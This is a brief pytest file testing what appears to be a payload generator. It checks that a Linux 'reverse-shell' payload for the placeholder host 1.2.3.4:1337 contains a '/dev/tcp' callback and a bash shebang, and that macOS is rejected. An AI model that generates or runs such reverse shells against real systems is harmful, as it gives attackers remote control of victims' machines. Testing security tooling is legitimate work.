import pytest
import sys
import os

# Ensure src is in path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../src')))

from modules.generator import Generator

def test_generate_bash():
    gen = Generator()
    payload = gen.generate("reverse-shell", "linux", "1.2.3.4", "1337")
    assert "/dev/tcp/1.2.3.4/1337" in payload
    assert "#!/bin/bash" in payload

def test_generate_unsupported_os():
    gen = Generator()
    with pytest.raises(ValueError):
        gen.generate("reverse-shell", "macos", "1.2.3.4", "1337")
